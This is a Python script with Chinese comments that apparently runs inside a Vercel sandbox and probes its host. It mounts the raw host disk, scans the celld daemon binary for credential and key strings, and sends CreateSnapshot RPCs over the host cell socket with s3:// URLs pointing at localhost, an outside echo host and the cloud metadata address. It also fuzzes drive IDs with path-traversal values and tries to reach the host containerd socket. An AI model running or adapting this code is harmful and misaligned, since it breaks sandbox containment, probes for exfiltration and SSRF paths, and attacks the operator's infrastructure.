# -*- coding: utf-8 -*-
"""vda6_snapshot_s3: CreateSnapshot s3:// 外带验证 + celld 二进制 python-strings + 工具盘点
1) python 实现 strings: celld 二进制提取 hive 路径/S3 相关关键词
2) CreateSnapshot: s3:// 变体 (echo 域/127.0.0.1/localhost 端口) 观察解析与网络行为
3) drive_id 变体 (cell_id 前缀/hvc_ 格式) 是否影响归属校验
4) 工具盘点: curl/grpcurl/wget 是否可用 + containerd gRPC 尝试 (curl --http2)
输出落盘 + 哨兵 V6S_DONE"""
import os, time, socket, ctypes, subprocess, re

OUT = '/vercel/sandbox/v6s.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def rpc_unix(sockpath, path, body='{}', t=4):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n%s' % (path, len(body), body))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:400].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    # P1: python strings celld
    log('=== P1 celld python-strings ===')
    try:
        data = open('/mnt/vdax/opt/vercel/celld', 'rb').read()
        log('celld bytes=%d' % len(data))
        # ASCII 字符串提取
        strs = re.findall(rb'[\x20-\x7e]{6,}', data)
        txt = b'\n'.join(strs).decode(errors='replace')
        log('str count=%d' % len(strs))
        hive = sorted(set(re.findall(r'vercel\.hive\.[A-Za-z0-9_.]{5,}', txt)))
        log('hive (%d): %s' % (len(hive), hive))
        m2 = sorted(set(re.findall(r'[A-Za-z0-9_.]+Service/[A-Z][A-Za-z0-9]{2,}', txt)))
        log('methods (%d): %s' % (len(m2), m2))
        for kw in ['s3://', 'drive_id', 'base_url', 'CreateSnapshot', 'credentials', 'access_key', 'secret_key',
                   'AWS', 'presign', 'upload', 'list_objects']:
            idxs = [m.start() for m in re.finditer(kw, txt)][:2]
            for i in idxs:
                log('ctx %s: ...%s...' % (kw, txt[max(0, i - 90):i + 130].replace('\n', ' ')))
    except Exception as e:
        log('P1 ERR %s' % e)

    # P2: CreateSnapshot s3:// 变体
    log('=== P2 s3:// base_url 变体 ===')
    sp = '/mnt/vdax/run/cell/cell.sock'
    PATH = '/vercel.hive.cell.api.drives.v1.DrivesService/CreateSnapshot'
    DID = 'a' * 32
    for url in ['s3://127.0.0.1:18080/bucket/key',
                's3://localhost/bucket/key',
                's3://sbx-echo-e29ca9cb.vercel.app/bucket/key',
                's3://169.254.169.254/bucket/key',
                's3://nonexistent-zzz.invalid/bucket/key',
                's3://amazonaws.com/bucket/key',
                's3://bucket.s3.amazonaws.com/key']:
        body = '{"drive_id":"%s","base_url":"%s"}' % (DID, url)
        t0 = time.time()
        st, bd = rpc_unix(sp, PATH, body, t=8)
        log('s3 %-55s -> %s (%.1fs) | %s' % (url, st, time.time() - t0, bd[:200].replace('\n', ' ')))
        time.sleep(0.5)

    # P3: drive_id 变体
    log('=== P3 drive_id 变体 ===')
    for did in ['a' * 32, 'b' * 64, 'hvc_iad1_b5d62a97_1bfd34f65a3249ed91ff80c4f18e9d92',
                '/vercel/sandbox', '..', '0', 'hvc_%s' % ('c' * 40)]:
        body = '{"drive_id":"%s","base_url":"s3://127.0.0.1:1/b/k"}' % did
        st, bd = rpc_unix(sp, PATH, body, t=5)
        log('did %-60s -> %s | %s' % (did[:60], st, bd[:150].replace('\n', ' ')))
        time.sleep(0.4)

    # P4: 工具盘点 + containerd gRPC
    log('=== P4 tools & containerd ===')
    for tool in ['curl', 'wget', 'grpcurl', 'nc', 'socat', 'openssl', 'python3']:
        r = subprocess.run(['sh', '-c', 'which %s || echo NO' % tool], capture_output=True, timeout=10)
        log('tool %s: %s' % (tool, r.stdout.decode(errors='replace').strip()))
    # curl --http2 调 containerd version
    try:
        r = subprocess.run(['curl', '--http2', '-s', '--unix-socket', '/mnt/vdax/run/containerd/containerd.sock',
                            '-H', 'content-type: application/grpc', '-X', 'POST',
                            '-d', '\x00\x00\x00\x00\x00', 'http://localhost/containerd.services.containerd.v1.VersionService/Version'],
                           capture_output=True, timeout=15)
        log('curl ctr ver -> rc=%d out=%r err=%r' % (r.returncode, r.stdout[:200], r.stderr[:200]))
    except Exception as e:
        log('curl ctr EXC %s' % e)

    log('V6S_DONE')
    f.close()


if __name__ == '__main__':
    main()
